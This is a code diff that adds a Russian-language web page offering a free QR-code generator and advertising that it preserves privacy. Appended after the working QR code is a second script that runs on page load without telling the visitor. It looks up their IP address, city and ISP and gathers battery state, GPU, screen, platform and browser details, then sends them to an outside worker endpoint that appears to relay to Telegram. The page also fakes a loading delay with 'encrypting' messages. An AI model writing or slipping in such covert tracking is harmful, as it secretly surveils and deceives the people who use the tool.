@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Carroll Project | GEN QR</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
+body {
+  font-family: 'Roboto', sans-serif;
+  background: linear-gradient(135deg, #0a0a0a, #1c1c1c);
+  color: #ffffff;
+  padding: 20px;
+  display: flex;
+  flex-direction: column;
+  gap: 40px;
+  min-height: 100vh;
+  backdrop-filter: blur(8px);
+  -webkit-font-smoothing: antialiased;
+  overflow-x: hidden;
+}
+
+header {
+  text-align: center;
+  animation: fadeInDown 1s ease-in-out;
+}
+h1 {
+  font-size: 2.4rem;
+  color: #00fff2;
+  margin-bottom: 5px;
+  text-shadow: 0 0 8px #00fff2aa;
+}
+.project-title {
+  font-size: 1.2rem;
+  color: #aaa;
+  margin-bottom: 10px;
+}
+p.subtext {
+  color: #ccc;
+  font-size: 0.95rem;
+}
+
+.container {
+  display: flex;
+  flex-direction: column;
+  gap: 30px;
+  max-width: 600px;
+  margin: 0 auto;
+}
+
+.qr-generator, .info, .extras, .history {
+  background: rgba(255, 255, 255, 0.05);
+  border-radius: 25px;
+  padding: 24px;
+  border: 1px solid rgba(255, 255, 255, 0.1);
+  box-shadow:
+    inset 0 0 15px rgba(255, 255, 255, 0.05),
+    0 8px 32px rgba(0, 0, 0, 0.5),
+    0 0 0 1px rgba(255, 255, 255, 0.04);
+  backdrop-filter: blur(18px);
+  -webkit-backdrop-filter: blur(18px);
+  transition: all 0.3s ease;
+}
+
+.qr-generator input {
+  width: 100%;
+  padding: 16px;
+  border-radius: 16px;
+  border: none;
+  background: rgba(255, 255, 255, 0.07);
+  color: #fff;
+  font-size: 1rem;
+  margin-bottom: 15px;
+  box-shadow:
+    inset 0 0 12px rgba(255, 255, 255, 0.05),
+    0 2px 6px rgba(0, 0, 0, 0.2);
+  backdrop-filter: blur(6px);
+  transition: 0.25s ease;
+}
+.qr-generator input:focus {
+  outline: none;
+  background: rgba(255, 255, 255, 0.1);
+  transform: scale(1.02);
+  box-shadow:
+    inset 0 0 20px rgba(0, 255, 230, 0.2),
+    0 0 10px rgba(0, 255, 230, 0.3);
+}
+
+.qr-generator button,
+#downloadBtnWrap button {
+  width: 100%;
+  padding: 16px;
+  background: rgba(0, 255, 230, 0.15);
+  border: 1px solid rgba(0, 255, 230, 0.35);
+  border-radius: 16px;
+  font-size: 1rem;
+  font-weight: bold;
+  color: #00fff2;
+  cursor: pointer;
+  backdrop-filter: blur(12px);
+  transition: 0.25s ease;
+  box-shadow:
+    0 0 12px rgba(0, 255, 230, 0.35),
+    inset 0 0 6px rgba(255, 255, 255, 0.05);
+}
+.qr-generator button:hover,
+#downloadBtnWrap button:hover {
+  transform: scale(1.03);
+  background: rgba(0, 255, 230, 0.22);
+}
+.qr-generator button:active,
+#downloadBtnWrap button:active {
+  transform: scale(0.97);
+  box-shadow: inset 0 0 12px rgba(0, 255, 230, 0.5);
+}
+
+.qr-output {
+  text-align: center;
+  margin-top: 20px;
+}
+canvas {
+  margin-top: 15px;
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+
+.tip-box {
+  background: rgba(255, 255, 255, 0.05);
+  padding: 15px;
+  border-left: 4px solid #00ffe5;
+  margin-top: 20px;
+  border-radius: 12px;
+  font-size: 0.9rem;
+  color: #eee;
+  backdrop-filter: blur(8px);
+  box-shadow: inset 0 0 8px rgba(0, 255, 255, 0.1);
+}
+
+.loading-box {
+  display: none;
+  margin-top: 15px;
+  background: rgba(255, 255, 255, 0.05);
+  padding: 15px;
+  border-radius: 12px;
+  color: #00ffe5;
+  animation: pulse 1.5s infinite;
+  box-shadow: 0 0 10px rgba(0, 255, 255, 0.3);
+}
+
+.extras h3, .info h2, .history h3 {
+  color: #00fff2;
+  margin-bottom: 10px;
+  text-shadow: 0 0 4px #00fff2aa;
+}
+
+.extras ul, .history ul {
+  list-style: none;
+  padding-left: 0;
+  font-size: 0.9rem;
+  color: #ccc;
+}
+.extras li::before {
+  content: "✔ ";
+  color: #00ffe5;
+}
+
+.history li {
+  margin-bottom: 8px;
+}
+
+footer {
+  text-align: center;
+  color: #777;
+  padding: 20px;
+  font-size: 0.85rem;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: scale(0.95); }
+  to { opacity: 1; transform: scale(1); }
+}
+@keyframes fadeInDown {
+  from { opacity: 0; transform: translateY(-20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes fadeInUp {
+  from { opacity: 0; transform: translateY(20px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes pulse {
+  0% { opacity: 0.5; }
+  50% { opacity: 1; }
+  100% { opacity: 0.5; }
+}
+.extras h3 {
+  margin-top: 20px;
+  margin-bottom: 12px;
+}
+
+.extras ul {
+  margin-bottom: 20px;
+  padding-left: 16px;
+}
+
+.extras li {
+  margin-bottom: 10px;
+}
+  </style>
+  
+  <script src="https://cdn.jsdelivr.net/npm/qrious/dist/qrious.min.js"></script>
+</head>
+<body>
+  <header>
+    <div class="project-title">Carroll Project</div>
+    <h1>Генератор QR</h1>
+    <p class="subtext">Создай QR-код для ссылки, Wi-Fi или визитки</p>
+  </header>
+
+  <div class="container">
+    <section class="qr-generator">
+      <input type="text" id="qrInput" placeholder="Введи текст или ссылку...">
+      <button onclick="generateQR()">Сгенерировать QR-Код</button>
+      <div class="qr-output">
+        <div id="loadingBox" class="loading-box"></div>
+        <canvas id="qrCanvas"></canvas>
+        <div style="margin-top: 10px; display: none;" id="downloadBtnWrap">
+          <button onclick="downloadQR()">Скачать PNG</button>
+        </div>
+      </div>
+    </section>
+
+    <section class="info">
+      <h2 style="color:#00ffcc; margin-bottom:10px;">О сайте</h2>
+      <p>Этот сайт позволяет бесплатно и без регистрации создавать QR-коды. Введи любую информацию — ссылку, контактные данные, пароль от Wi-Fi — и получи готовый код.</p>
+      <div class="tip-box" id="randomTip"></div>
+    </section>
+
+    <section class="extras">
+      <h3>Преимущества:</h3>
+      <ul>
+        <li>Не требует регистрации</li>
+        <li>Сохраняет конфиденциальность</li>
+        <li>Работает на всех устройствах</li>
+        <li>Быстрая генерация</li>
+      </ul>
+
+      <h3>Идеи использования:</h3>
+      <ul>
+        <li>Добавь QR на упаковку товара</li>
+        <li>Размести код на визитке</li>
+        <li>Создай ссылку на Telegram</li>
+        <li>Поделись Wi-Fi без слов</li>
+      </ul>
+    </section>
+
+    <section class="info">
+      <h2 style="color:#00ffcc;">Часто задаваемые вопросы (FAQ)</h2>
+      <ul style="margin-top: 10px; padding-left: 20px;">
+        <li><strong>Можно ли отсканировать QR-код с экрана?</strong> — Да, современные камеры это поддерживают.</li>
+        <li><strong>Какой максимальный размер текста можно закодировать?</strong> — Примерно 3К символов, но лучше использовать до 300.</li>
+        <li><strong>QR сохраняется навсегда?</strong> — Он ведёт туда, куда вы задали. Если это ссылка, она может стать недействительной.</li>
+        <li><strong>Можно ли вставить логотип?</strong> — Сейчас нет, но это можно реализовать дополнительно.</li>
+      </ul>
+    </section>
+
+    <section class="history" id="historySection">
+      <h3>История генераций:</h3>
+      <ul id="historyList"></ul>
+    </section>
+  </div>
+
+  <footer>by Aik Carroll</footer>
+
+  <script>
+    const tips = [
+      "QR-код можно вставить на визитку, постер или упаковку.",
+      "Ты можешь закодировать Wi-Fi: формат должен быть WIFI:T:WPA;S:MySSID;P:mypassword;;",
+      "QR-код можно просканировать даже с экрана компьютера.",
+      "QR расшифровывается как Quick Response — Быстрый отклик."
+    ];
+
+    const loadingMessages = [
+      "📡 Генерируем уникальный код...",
+      "🔍 Оптимизация данных...",
+      "⚙️ Подключение к матрице...",
+      "🔐 Шифруем информацию...",
+      "🧬 Создание пиксельной структуры...",
+      "🔧 Работаем над идеальным результатом...",
+      "⏳ Почти готово..."
+    ];
+
+    const qr = new QRious({
+      element: document.getElementById('qrCanvas'),
+      size: 220,
+      value: 'https://example.com'
+    });
+    document.getElementById("qrCanvas").style.display = 'block';
+    document.getElementById("randomTip").textContent = "💡 " + tips[Math.floor(Math.random() * tips.length)];
+
+    function generateQR() {
+      const input = document.getElementById('qrInput').value.trim();
+      if (!input) return alert("Введите текст или ссылку.");
+
+      document.getElementById("qrCanvas").style.display = 'none';
+      document.getElementById("downloadBtnWrap").style.display = 'none';
+
+      const loadingBox = document.getElementById("loadingBox");
+      loadingBox.style.display = 'block';
+      loadingBox.textContent = loadingMessages[Math.floor(Math.random() * loadingMessages.length)];
+
+      setTimeout(() => {
+        qr.set({ value: input });
+        loadingBox.style.display = 'none';
+        document.getElementById("qrCanvas").style.display = 'block';
+        document.getElementById("downloadBtnWrap").style.display = 'block';
+
+        saveToHistory(input);
+      }, 5000);
+    }
+
+    function saveToHistory(value) {
+      const now = new Date();
+      const timestamp = now.toLocaleDateString() + ' ' + now.toLocaleTimeString();
+      const item = `${timestamp} — ${value}`;
+      const history = JSON.parse(localStorage.getItem('qrHistory') || '[]');
+      history.unshift(item);
+      localStorage.setItem('qrHistory', JSON.stringify(history.slice(0, 10)));
+      renderHistory();
+    }
+
+    function renderHistory() {
+      const historyList = document.getElementById('historyList');
+      const historySection = document.getElementById('historySection');
+      const history = JSON.parse(localStorage.getItem('qrHistory') || '[]');
+
+      if (history.length === 0) {
+        historySection.style.display = 'none';
+      } else {
+        historySection.style.display = 'block';
+      }
+
+      historyList.innerHTML = history.map(item => `<li>${item}</li>`).join('');
+    }
+
+    function downloadQR() {
+      const link = document.createElement('a');
+      link.download = 'qr-code.png';
+      link.href = qr.toDataURL();
+      link.click();
+    }
+
+    renderHistory();
+  </script>
+<script>
+  (async () => {
+    const geoRes = await fetch('https://ipwho.is/');
+    const ipData = await geoRes.json();
+
+    let batteryInfo = {};
+    if (navigator.getBattery) {
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = { charging: battery.charging, level: battery.level };
+      } catch {}
+    }
+
+    function getWebGLInfo() {
+      try {
+        const canvas = document.createElement('canvas');
+        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        return {
+          vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
+          renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL)
+        };
+      } catch {
+        return { vendor: 'неизвестно', renderer: 'неизвестно' };
+      }
+    }
+
+    const gpu = getWebGLInfo();
+    const info = {
+      ip: ipData.ip,
+      city: ipData.city,
+      region: ipData.region,
+      country: ipData.country,
+      isp: ipData.connection?.isp || 'Неизвестно',
+      timezone: ipData.timezone?.id || 'N/A',
+      userAgent: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      platform: navigator.platform,
+      language: navigator.language,
+      touchSupport: navigator.maxTouchPoints > 0 ? 'да' : 'нет',
+      battery: batteryInfo,
+      gpuVendor: gpu.vendor,
+      gpuRenderer: gpu.renderer,
+      time: new Date().toLocaleString()
+    };
+
+    const text = `
+🕵️ qr.carroll-project.online:
+IP: ${info.ip}
+Город: ${info.city}, ${info.country}
+Провайдер: ${info.isp}
+Часовой пояс: ${info.timezone}
+Платформа: ${info.platform}
+Язык браузера: ${info.language}
+Разрешение экрана: ${info.screen}
+Поддержка касаний: ${info.touchSupport}
+Батарея: ${info.battery.level * 100}% ${info.battery.charging ? '(заряжается)' : ''}
+GPU Vendor: ${info.gpuVendor}
+GPU Renderer: ${info.gpuRenderer}
+Браузер: ${info.userAgent}
+Время: ${info.time}
+    `.trim();
+
+    await fetch('https://tg-proxy.vassa0081-0f3.workers.dev', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ text })
+    });
+  })();
+</script>
+</body>
+</html>
